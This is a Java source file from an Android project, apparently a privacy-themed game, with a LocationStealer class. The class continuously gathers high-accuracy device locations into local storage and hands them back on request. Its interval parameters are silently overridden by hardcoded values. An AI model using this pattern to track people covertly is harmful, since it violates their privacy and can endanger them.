package de.hpi3d.gamepgrog.trap.android;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.location.Location;
import android.os.Looper;
import android.util.Log;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;

import java.util.List;

import de.hpi3d.gamepgrog.trap.api.StorageManager;
import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
import de.hpi3d.gamepgrog.trap.future.ArrayExt;
import de.hpi3d.gamepgrog.trap.future.Consumer;
import de.hpi3d.gamepgrog.trap.future.Function;

public class LocationStealer {

    private static final int MAX_INTERVAL = 10 * 1000;
    private static final int FAST_INTERVAL = 1000;
    private static final int CURRENT_INTERVAL = 100;

    private static boolean currentlyStealing = false;

    public static void startStealing(Application c) {
        if (currentlyStealing) {
            return;
        }

        currentlyStealing = true;
        StorageManager.with(c).locations.reset();

        requestLocations(c, MAX_INTERVAL, FAST_INTERVAL, locationData -> {
            StorageManager.with(c).locations.add(locationData);
            return true;
        });
        Log.d("LocationStealer", "Started stealing locations");
    }

    public static List<LocationData> getStealResult(Activity c) {
        currentlyStealing = false;
        List<LocationData> data = StorageManager.with(c).locations.get();
        StorageManager.with(c).locations.reset();
        return data;
    }

    public static void takeSingleLocationData(Context context, Consumer<List<LocationData>> consumer) {
        requestLocations(context, CURRENT_INTERVAL, CURRENT_INTERVAL, (location) -> {
            consumer.accept(ArrayExt.toArrayList(location));
            return false;
        });
    }

    private static void requestLocations(Context c, int maxInterval, int fastInterval,
                                         Function<LocationData, Boolean> callback) {
        FusedLocationProviderClient client = new FusedLocationProviderClient(c);
        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(100);
        locationRequest.setFastestInterval(50);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        LocationCallback locationCallback = new LocationCallback() {
            private boolean running = true;

            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null || !running) {
                    return;
                }
                Location last = locationResult.getLastLocation();
                if (last != null) {
                    running = callback.apply(new LocationData(last));

                    if (!running)
                        client.removeLocationUpdates(this);
                }
            }
        };

        client.requestLocationUpdates(locationRequest,
                locationCallback,
                Looper.getMainLooper());
    }
}
